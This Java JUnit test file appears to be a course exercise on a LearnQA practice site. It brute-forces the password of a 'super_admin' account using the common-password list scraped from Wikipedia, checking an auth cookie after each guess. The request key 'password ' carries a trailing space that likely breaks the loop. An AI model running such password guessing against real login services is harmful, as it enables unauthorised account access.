import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import io.restassured.path.json.JsonPath;
import io.restassured.path.xml.XmlPath;
import io.restassured.response.Response;
import lombok.Getter;
import lombok.Setter;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import static io.restassured.path.xml.XmlPath.CompatibilityMode.HTML;

public class Ex9Test {

    @Test
    void passwordSelection() throws IOException {

        ArrayList<String> pws = nonRecurringPasswords(passwords());
        Map<String, String> params = new HashMap<>();
        params.put("login", "super_admin");

        for (String pw : pws) {
            params.put("password ", pw);

            Response response = RestAssured
                    .given()
                    .body(params)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String responseCookie = response.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            if (responseCookie != null) {
                cookies.put("auth_cookie", responseCookie);
            }

            Response response2 = RestAssured
                    .given()
                    .body(params)
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            XmlPath htmlPath = new XmlPath(HTML, response2.getBody().asString());

            if (!htmlPath.getString("html.body").equals("You are NOT authorized")) {
                System.out.println("password = " + pw + ", message - " + htmlPath.getString("html.body"));
            }
        }
    }

    public ArrayList<String> passwords() throws IOException {
        Document doc = Jsoup.connect("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords").get();
        Element table = doc.select("table").get(1);

        ArrayList<String> pws = new ArrayList<>();

        Elements rows = table.select("tr");
        Elements cols;

        for (int i = 1; i < rows.size(); i++) {
            Element row = rows.get(i);
            cols = row.select("td");
            pws.add(cols.get(1).text());
            pws.add(cols.get(2).text());
            pws.add(cols.get(3).text());
            pws.add(cols.get(4).text());
            pws.add(cols.get(5).text());
            pws.add(cols.get(6).text());
            pws.add(cols.get(7).text());
            pws.add(cols.get(8).text());
            pws.add(cols.get(9).text());
        }
        return pws;
    }

    public ArrayList<String> nonRecurringPasswords(ArrayList<String> passwords){
        ArrayList<String> pws = new ArrayList<>();

        for (String password : passwords) {
            if(!pws.contains(password)){
                pws.add(password);
            }
        }
        System.out.println("Список неповторяющихся паролей из таблицы Top 25 most common passwords by year according to SplashData:  " + pws);
        return pws;
    }

//    @Test
//    void checkArray() throws IOException {
//        nonRecurringPasswords(passwords());
//    }
}
